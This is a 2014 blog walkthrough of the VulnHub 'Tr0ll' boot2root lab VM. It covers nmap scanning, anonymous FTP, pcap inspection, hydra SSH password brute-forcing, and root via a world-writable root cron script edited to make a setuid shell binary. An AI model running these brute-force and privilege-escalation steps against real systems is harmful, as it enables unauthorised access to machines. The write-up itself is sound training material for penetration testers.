      <h1 class="entry-title"><a href="/blog/2014/08/15/taming-the-troll/">taming (actually just solving) the troll</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2014-08-15T07:12:03+02:00" pubdate data-updated="true">Aug 15<sup>th</sup>, 2014</time>
        
      </p>
    
  </header>


  <div class="entry-content"><h2>foreword</h2>

<p>Having recently started the road to <a href="http://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/">OSCP</a>, <a href="https://twitter.com/Maleus21">@Maleus21</a> released <a href="http://vulnhub.com/entry/tr0ll-1,100/">Tr0ll</a> on <a href="https://twitter.com/VulnHub">@VulnHub</a>. I figured since the description was <em>Difficulty: Beginner ; Type: boot2root</em>, I could give it a smash in a evening as a bit of distraction.</p>

<h2>nomad, promise</h2>

<p>As usual, I downloaded the VM, extracted the <code>.rar</code> and slapped it in Virtual Box. I got the IP 192.168.56.101. Promptly a NMAP was run against it:</p>

<figure class='code'><figcaption><span>Tr0ll nmap</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nmap -v --reason -sV 192.168.56.101 -p-
</span><span class='line'>
</span><span class='line'>PORT   STATE SERVICE REASON  VERSION
</span><span class='line'>21/tcp open  ftp     syn-ack vsftpd 3.0.2
</span><span class='line'>22/tcp open  ssh     syn-ack <span class="o">(</span>protocol 2.0<span class="o">)</span>
</span><span class='line'>80/tcp open  http    syn-ack Apache httpd 2.4.7 <span class="o">((</span>Ubuntu<span class="o">))</span>
</span></code></pre></td></tr></table></div></figure>


<p>So, <code>ssh</code>, <code>ftp</code>, and <code>http</code>. Naturally my first reaction was to inspect the web service.</p>

<p><img src="https://i.imgur.com/SiNzlyi.png"></p>

<p>The <code>robots.txt</code> file revealed:</p>

<figure class='code'><figcaption><span>Tr0ll robots.txt</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>User-agent:*
</span><span class='line'>Disallow: /secret
</span></code></pre></td></tr></table></div></figure>


<p>Browsing to <code>/secret</code> revealed yet another <em>interesting</em> piece of art:</p>

<p><img src="https://i.imgur.com/E2SezsL.png"></p>

<p>Right&hellip; A little early to be &lsquo;mad&rsquo;, but nonetheless, lets move on.</p>

<h2>anonny-mouse ftp</h2>

<p>A quick and lazy google for <code>vsftpd 3.0.2 exploit</code> didn&rsquo;t reveal anything interesting on page 1, so I lost interest pretty fast. I figured I can just try my luck and attempt to login to the FTP service with anonymous creds:</p>

<figure class='code'><figcaption><span>Tr0ll ftp login</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# ftp 192.168.56.101
</span><span class='line'>Connected to 192.168.56.101.
</span><span class='line'>220 <span class="o">(</span>vsFTPd 3.0.2<span class="o">)</span>
</span><span class='line'>Name <span class="o">(</span>192.168.56.101:root<span class="o">)</span>: anonymous
</span><span class='line'>331 Please specify the password.
</span><span class='line'>Password:
</span><span class='line'>230 Login successful.
</span><span class='line'>Remote system <span class="nb">type </span>is UNIX.
</span><span class='line'>Using binary mode to transfer files.
</span><span class='line'>
</span><span class='line'>ftp&gt; ls
</span><span class='line'>500 Illegal PORT command.
</span><span class='line'>ftp: <span class="nb">bind</span>: Address already in use
</span><span class='line'>
</span><span class='line'>ftp&gt; passive
</span><span class='line'>Passive mode on.
</span><span class='line'>
</span><span class='line'>ftp&gt; ls
</span><span class='line'>227 Entering Passive Mode <span class="o">(</span>192,168,56,101,231,190<span class="o">)</span>
</span><span class='line'>150 Here comes the directory listing.
</span><span class='line'>-rwxrwxrwx    1 1000     0            8068 Aug 10 00:43 lol.pcap
</span><span class='line'>226 Directory send OK.
</span><span class='line'>
</span><span class='line'>ftp&gt; get lol.pcap
</span><span class='line'><span class="nb">local</span>: lol.pcap remote: lol.pcap
</span><span class='line'>227 Entering Passive Mode <span class="o">(</span>192,168,56,101,189,113<span class="o">)</span>
</span><span class='line'>150 Opening BINARY mode data connection <span class="k">for </span>lol.pcap <span class="o">(</span>8068 bytes<span class="o">)</span>.
</span><span class='line'>226 Transfer complete.
</span><span class='line'>8068 bytes received in 0.00 secs <span class="o">(</span>21294.3 kB/s<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>ftp&gt; bye
</span><span class='line'>221 Goodbye.
</span></code></pre></td></tr></table></div></figure>


<p>Well that worked, and showed that we have a file <code>lol.pcap</code> to look at. Interesting. I fired up wireshark and opened the pcap. Following the TCP streams it looked like in a previous session there was activity with a file called <code>secret_stuff.txt</code> that is no longer available. I filtered out that stream and continued down the rabbit hole, until I saw the message:</p>

<p><img src="https://i.imgur.com/vpgEP3o.png"></p>

<p>Ok. Well. I tried a few things after this, until eventually I figured it may be a web path. Sooo, off to the website we went and browsed to <a href="http://192.168.56.101/sup3rs3cr3tdirlol/.">http://192.168.56.101/sup3rs3cr3tdirlol/.</a> In this path there was a binary  called <code>roflmao</code>. I downloaded the bin and did some static analysis (paranoid and all that) to see if I can figure out what it does before running it. Eventually I just made it executable and ran it:</p>

<figure class='code'><figcaption><span>Tr0ll roflmao file</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# wget http://192.168.56.101/sup3rs3cr3tdirlol/roflmao
</span><span class='line'>--2014-08-15 07:57:56--  http://192.168.56.101/sup3rs3cr3tdirlol/roflmao
</span><span class='line'>Connecting to 192.168.56.101:80... connected.
</span><span class='line'>HTTP request sent, awaiting response... 200 OK
</span><span class='line'>Length: 7296 <span class="o">(</span>7.1K<span class="o">)</span>
</span><span class='line'>Saving to: <span class="sb">`</span>roflmao<span class="s1">&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="s1">100%[======&gt;] 7,296       --.-K/s   in 0s      </span>
</span><span class='line'>
</span><span class='line'><span class="s1">2014-08-15 07:57:56 (826 MB/s) - `roflmao&#39;</span> saved <span class="o">[</span>7296/7296<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>root@kali:~/Desktop/Tr0ll# chmod +x roflmao
</span><span class='line'>root@kali:~/Desktop/Tr0ll# ./roflmao
</span><span class='line'>Find address 0x0856BF to proceed
</span></code></pre></td></tr></table></div></figure>


<p>Nice. <code>0x0856BF</code> is not exactly helpful. But what does it mean? From the previous analysis I have done it also looked like the bin is really just printing the string as can be seen above. After some poking around and exchanging ideas with <a href="https://twitter.com/barrebas">@barrebas</a> on IRC, I remembered that the previous vague hint was a directory on the web site. So, I tried <a href="http://192.168.56.101/0x0856BF/:">http://192.168.56.101/0x0856BF/:</a></p>

<p><img src="https://i.imgur.com/yXWgKij.png"></p>

<h2>nohydraplz</h2>

<p>Cool! At this stage I was pretty sure there was not much left to gain shell. The folder <code>good_luck</code> had a file called <code>which_one_lol.txt</code> with contents:</p>

<figure class='code'><figcaption><span>which_one_lol.txt</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>maleus
</span><span class='line'>ps-aux
</span><span class='line'>felux
</span><span class='line'>Eagle11
</span><span class='line'>genphlux &lt; -- Definitely not this one
</span><span class='line'>usmc8892
</span><span class='line'>blawrg
</span><span class='line'>wytshadow
</span><span class='line'>vis1t0r
</span><span class='line'>overflow
</span></code></pre></td></tr></table></div></figure>


<p>List of passwords? Dunno. The folder <code>this_folder_contains_the_password</code> had a file <code>Pass.txt</code> with contents:</p>

<figure class='code'><figcaption><span>Pass.txt</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>Good_job_:)
</span></code></pre></td></tr></table></div></figure>


<p>At this stage I figured this had to be either a nicely provided wordlist for some <code>hydra</code> action on the <code>ftp</code> || <code>ssh</code> service. So naturally, I copied the information to a file called <code>list.txt</code> (also made a copy of the <code>genphlux</code> word so that its on its own line), and fired up hydra on <code>ssh</code>:</p>

<figure class='code'><figcaption><span>Tr0ll hydra</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# hydra -v -V -u -L list -P list -t 1 -u 192.168.56.101 ssh
</span><span class='line'>Hydra v7.6 <span class="o">(</span>c<span class="o">)</span>2013 by van Hauser/THC <span class="p">&amp;</span> David Maciejak - <span class="k">for </span>legal purposes only
</span><span class='line'>
</span><span class='line'><span class="o">[</span>DATA<span class="o">]</span> attacking service ssh on port 22
</span><span class='line'><span class="o">[</span>VERBOSE<span class="o">]</span> Resolving addresses ... <span class="k">done</span>
</span><span class='line'><span class="o">[</span>ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;maleus&quot;</span> - pass <span class="s2">&quot;maleus&quot;</span> - 1 of 169 <span class="o">[</span>child 0<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;ps-aux&quot;</span> - pass <span class="s2">&quot;maleus&quot;</span> - 2 of 169 <span class="o">[</span>child 0<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;felux&quot;</span> - pass <span class="s2">&quot;maleus&quot;</span> - 3 of 169 <span class="o">[</span>child 0<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;Eagle11&quot;</span> - pass <span class="s2">&quot;maleus&quot;</span> - 4 of 169 <span class="o">[</span>child 0<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;genphlux &lt; -- Definitely not this one&quot;</span> - pass <span class="s2">&quot;maleus&quot;</span> - 5 of 169 <span class="o">[</span>child 0<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;genphlux&quot;</span> - pass <span class="s2">&quot;maleus&quot;</span> - 6 of 169 <span class="o">[</span>child 0<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;usmc8892&quot;</span> - pass <span class="s2">&quot;maleus&quot;</span> - 7 of 169 <span class="o">[</span>child 0<span class="o">]</span>
</span><span class='line'>
</span><span class='line'><span class="o">[</span>ERROR<span class="o">]</span> could not connect to target port 22
</span><span class='line'><span class="o">[</span>ERROR<span class="o">]</span> ssh protocol error
</span><span class='line'><span class="o">[</span>VERBOSE<span class="o">]</span> Retrying connection <span class="k">for </span>child 0
</span><span class='line'><span class="o">[</span>RE-ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;usmc8892&quot;</span> - pass <span class="s2">&quot;maleus&quot;</span> - 7 of 169 <span class="o">[</span>child 0<span class="o">]</span>
</span><span class='line'>
</span><span class='line'><span class="o">[</span>ERROR<span class="o">]</span> could not connect to target port 22
</span><span class='line'><span class="o">[</span>ERROR<span class="o">]</span> ssh protocol error
</span><span class='line'><span class="o">[</span>VERBOSE<span class="o">]</span> Retrying connection <span class="k">for </span>child 0
</span><span class='line'><span class="o">[</span>RE-ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;usmc8892&quot;</span> - pass <span class="s2">&quot;maleus&quot;</span> - 7 of 169 <span class="o">[</span>child 0<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>Err, the sudden errors only meant one thing&hellip; <code>fail2ban</code>.</p>

<figure class='code'><figcaption><span>Tr0ll ssh filtered</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nmap -v --reason -Pn 192.168.56.101 -p 22
</span><span class='line'>
</span><span class='line'>PORT   STATE    SERVICE REASON
</span><span class='line'>22/tcp filtered ssh     no-response
</span></code></pre></td></tr></table></div></figure>


<p>So, this was the first part that frustrated me and had me going <em>&ldquo;seriously&hellip; :\&rdquo;</em>. Maybe this was actually a list of <code>ftp</code> creds? Sadly, that did not seem to be the case either. And so I was stuck once again. Hydra was slowly trickling on once the ssh service was unbanned again, but it was annoying as heck.</p>

<h2>first shell</h2>

<p>I kept bouncing the VM to get the ssh service back faster, allowing hydra to do it&rsquo;s <code>thing</code>. Eventually, it was apparent that none of these words as a username/password combination was the correct one.</p>

<p>Returning to the web interface and the word lists, I realized (with some subtle hints and reminders from @barrebas to <em>read</em> everything), that the password may be in this folder (<code>this_folder_contains_the_password</code>). Get it, the <code>Pass.txt</code> is the password&hellip;</p>

<p>Right, so I changed <code>hydra</code> slightly to use <code>Pass.txt</code> as a password and continued to brute with the original <code>list.txt</code> as usernames:</p>

<figure class='code'><figcaption><span>Tr0ll hydra success`</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# hydra -v -V -u -L list -p <span class="s2">&quot;Pass.txt&quot;</span> -t 1 -u 192.168.56.101 ssh
</span><span class='line'>Hydra v7.6 <span class="o">(</span>c<span class="o">)</span>2013 by van Hauser/THC <span class="p">&amp;</span> David Maciejak - <span class="k">for </span>legal purposes only
</span><span class='line'>
</span><span class='line'><span class="o">[</span>DATA<span class="o">]</span> 1 task, 1 server, 13 login tries <span class="o">(</span>l:13/p:1<span class="o">)</span>, ~13 tries per task
</span><span class='line'><span class="o">[</span>DATA<span class="o">]</span> attacking service ssh on port 22
</span><span class='line'><span class="o">[</span>VERBOSE<span class="o">]</span> Resolving addresses ... <span class="k">done</span>
</span><span class='line'><span class="o">[</span>ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;maleus&quot;</span> - pass <span class="s2">&quot;Pass.txt&quot;</span> - 1 of 13 <span class="o">[</span>child 0<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;ps-aux&quot;</span> - pass <span class="s2">&quot;Pass.txt&quot;</span> - 2 of 13 <span class="o">[</span>child 0<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;felux&quot;</span> - pass <span class="s2">&quot;Pass.txt&quot;</span> - 3 of 13 <span class="o">[</span>child 0<span class="o">]</span>
</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
</span><span class='line'><span class="o">[</span>22<span class="o">][</span>ssh<span class="o">]</span> host: 192.168.56.101   login: overflow   password: Pass.txt
</span></code></pre></td></tr></table></div></figure>


<p>Yay <code>overflow:Pass.txt</code> should get us a session via ssh:</p>

<figure class='code'><figcaption><span>Tr0ll ssh</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/Desktop/Tr0ll# ssh overflow@192.168.56.101
</span><span class='line'>overflow@192.168.56.101<span class="err">&#39;</span>s password:
</span><span class='line'>Welcome to Ubuntu 14.04.1 LTS <span class="o">(</span>GNU/Linux 3.13.0-32-generic i686<span class="o">)</span>
</span><span class='line'>
</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>Could not chdir to home directory /home/overflow: No such file or directory
</span><span class='line'><span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>overflow<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>overflow<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>overflow<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<h2>&hellip; and root</h2>

<p>And so it was time for classic enumeration again. The first <em>strange</em> thing was the fact that it appeared as if all the <code>/home</code> directories apart from <code>/home/troll</code> was deleted. Weird. Other than that, there were a whole bunch of users according to <code>/etc/passwd</code>, and I can&rsquo;t run anything as <code>root</code> via <code>sudo</code>.</p>

<p>There was a file in <code>/opt/</code> called <code>lmao.py</code>, however I did not have access to read it. Soooo, more enumeration.</p>

<p><em>suddenly</em></p>

<figure class='code'><figcaption><span>Tr0ll times up</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Broadcast Message from root@trol
</span><span class='line'>        <span class="o">(</span>somewhere<span class="o">)</span> at 16:05 ...
</span><span class='line'>
</span><span class='line'>TIMES UP LOL!
</span><span class='line'>
</span><span class='line'>Connection to 192.168.56.101 closed by remote host.
</span><span class='line'>Connection to 192.168.56.101 closed.
</span><span class='line'>root@kali:~#
</span></code></pre></td></tr></table></div></figure>


<p>Urgh. Turns out, something is killing my ssh session every 5 minutes. <strong>Oh my word</strong>, was that annoying. I could handle everything the VM&rsquo;s offered, but this was probably the worst part of it.</p>

<p>Eventually, I was searching for executable files on the filesystem. I was filtering out a large chunk and gradually paging though results to find that odd one out. To help filter out uninteresting stuff, it looked like the VM was built in August, so I just grep for that in the results, hoping that the <em>thing</em> I should be finding has a more recent timestamp:</p>

<figure class='code'><figcaption><span>Tr0ll check </span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>overflow@troll:/<span class="nv">$ </span>find / -executable -type f 2&gt; /dev/null <span class="p">|</span> egrep -v <span class="s2">&quot;^/bin|^/var|^/etc|^/usr&quot;</span> <span class="p">|</span> xargs ls -lh <span class="p">|</span> grep Aug
</span><span class='line'>
</span><span class='line'>-rwxrwxrwx 1 root  root    145 Aug 14 13:11 /lib/log/cleaner.py
</span><span class='line'>-rwx--x--x 1 root  root    117 Aug 10 02:11 /opt/lmao.py
</span><span class='line'>-rwxr-xr-x 1 root  root   2.4K Aug 27  2013 /sbin/installkernel
</span><span class='line'>-rwxrwxrwx 1 troll root   7.9K Aug 10 00:43 /srv/ftp/lol.pcap
</span></code></pre></td></tr></table></div></figure>


<p>A few interesting results came from that, however, the one that held the golden nugget was <code>/lib/log/cleaner.py</code>. During my enumeration I noticed that <code>/tmp</code> got cleaned out at a really strange time as I was still trying to <code>less</code> a file in there, however, it just <em>disappeared</em>.</p>

<p>Anyways, as <code>cleaner.py</code> was owned by root and running <code>os.system</code>, I just modified it to prepare me a classic <code>getroot</code> binary:</p>

<figure class='code'><figcaption><span>cleaner.py</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/env python</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">os</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'><span class="k">try</span><span class="p">:</span>
</span><span class='line'>    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">&#39;chown root:root /var/tmp/getroot; chmod 4755 /var/tmp/getroot &#39;</span><span class="p">)</span>
</span><span class='line'><span class="k">except</span><span class="p">:</span>
</span><span class='line'>    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>I waited for that annoying &lsquo;Times UP&rsquo; message, and inspected <code>/var/tmp</code>:</p>

<figure class='code'><figcaption><span>rooted</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>overflow@troll:/<span class="nv">$ </span>ls -lah /var/tmp/
</span><span class='line'>total 24K
</span><span class='line'>drwxrwxrwt  2 root     root     4.0K Aug 14 13:11 .
</span><span class='line'>drwxr-xr-x 12 root     root     4.0K Aug 10 03:56 ..
</span><span class='line'>-rwxrwxrwx  1 root     root       34 Aug 13 01:16 cleaner.py.swp
</span><span class='line'>-rwsr-xr-x  1 root     root     7.2K Aug 14 13:09 getroot
</span><span class='line'>-rw-rw-r--  1 overflow overflow   71 Aug 14 13:09 sh.c
</span><span class='line'>
</span><span class='line'>overflow@troll:/<span class="nv">$ </span>/var/tmp/getroot
</span><span class='line'><span class="c">#</span>
</span><span class='line'><span class="c"># id</span>
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>overflow<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1002<span class="o">(</span>overflow<span class="o">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># ls /root</span>
</span><span class='line'>proof.txt
</span><span class='line'>
</span><span class='line'><span class="c"># cat /root/proof.txt</span>
</span><span class='line'>Good job, you did it!
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>702a8c18d29c6f3ca0d99ef5712bfbdc
</span><span class='line'><span class="c">#</span>
</span></code></pre></td></tr></table></div></figure>


<h2>for the curious</h2>

<p>That really annoying session that keeps dying? Turns out its <code>/opt/lmao.py</code> to blame:</p>

<figure class='code'><figcaption><span>grr</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># cat /opt/lmao.py</span>
</span><span class='line'><span class="c">#!/usr/bin/env python</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">os</span>
</span><span class='line'>
</span><span class='line'><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">&#39;echo &quot;TIMES UP LOL!&quot;|wall&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">&quot;pkill -u &#39;overflow&#39;&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="c"># </span>
</span></code></pre></td></tr></table></div></figure>


<p>Thanks <a href="https://twitter.com/maleus21">@maleus21</a> for the VM!</p>
</div>
  
  


    </article>
  
  <div class="pagination">
    
      <a class="prev" href="/posts/2">&larr; Older</a>
    
    <a href="/blog/archives">Blog Archives</a>
    
  </div>
</div>
<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2014/09/18/from-persistence/">From Persistence, to pain, to PWN</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/08/17/kali-linux-oracle-support/">Kali Linux Oracle Support</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/08/15/taming-the-troll/">taming (actually just solving) the troll</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/08/09/beating-xerxes2/">Beating Xerxes 2 (no, not the Persian King)</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/08/07/flick-can-you-find-the-flag/">flick - can you find the flag?</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/07/20/hell-would-just-not-freeze-over/">Hell would just not freeze over!</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/07/17/climbing-the-skytower/">Climbing the SkyTower</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/03/11/dnsfilexfer-yet-another-take-on-file-transfer-via-dns/">dnsfilexfer - yet another take on file transfer via DNS</a>
      </li>
    
      <li class="post">
        <a href="/blog/2013/11/18/slash-root-slash-flag-dot-txt-solving-the-relativity-vulnerable-vm/">/root/flag.txt - Solving the Relativity Vulnerable VM</a>
      </li>
    
      <li class="post">
        <a href="/blog/2013/09/23/zeus-my-adventure-with-a-infamous-bot/">Zeus - My Adventure with a Infamous Bot</a>
      </li>
    
  </ul>
</section>

<section>
  <h1>GitHub Repos</h1>
  <ul id="gh_repos">
    <li class="loading">Status updating&#8230;</li>
  </ul>
  
  <a href="https://github.com/leonjza">@leonjza</a> on GitHub
  
  <script type="text/javascript">
    $(document).ready(function(){
        if (!window.jXHR){
            var jxhr = document.createElement('script');
            jxhr.type = 'text/javascript';
            jxhr.src = '/javascripts/libs/jXHR.js';
            var s = document.getElementsByTagName('script')[0];
            s.parentNode.insertBefore(jxhr, s);
        }

        github.showRepos({
            user: 'leonjza',
            count: 8,
            skip_forks: true,
            target: '#gh_repos'
        });
    });
  </script>
  <script src="/javascripts/github.js" type="text/javascript"> </script>
</section>





  
</aside>

    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2014 - Leon Jacobs -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
